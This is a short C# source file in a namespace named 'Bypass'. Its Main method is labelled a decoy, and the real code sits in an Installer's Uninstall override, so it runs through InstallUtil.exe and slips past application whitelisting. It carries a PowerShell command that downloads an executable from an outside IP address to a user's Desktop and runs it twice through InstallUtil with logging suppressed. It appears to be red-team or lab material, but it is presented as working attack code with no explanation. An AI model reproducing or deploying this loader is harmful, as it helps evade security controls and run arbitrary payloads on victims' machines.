using System; 
using System.Management.Automation; 
using System.Management.Automation.Runspaces; 
using System.Configuration.Install; 

namespace Bypass 
{ 
    class Program 
    { 
        static void Main(string[] args) 
        { 
            Console.WriteLine("This is the main method which is a decoy"); 
        } 
    } 

    [System.ComponentModel.RunInstaller(true)] 
    public class Sample : Installer 
    { 
        public override void Uninstall(System.Collections.IDictionary savedState) 
        {
            string cmd = "powershell iwr -uri http://192.168.130.136/program3.exe -outfile c:\\users\\dhanush\\Desktop\\mon.exe;c:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false /U c:\\users\\dhanush\\Desktop\\mon.exe;timeout /t 10;c:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false /U c:\\users\\dhanush\\Desktop\\mon.exe"; 
            Runspace rs = RunspaceFactory.CreateRunspace(); 
            rs.Open(); 

            PowerShell ps = PowerShell.Create(); 
            ps.Runspace = rs; 

            ps.AddScript(cmd); 

            ps.Invoke(); 

            rs.Close(); 
        } 
    } 
}
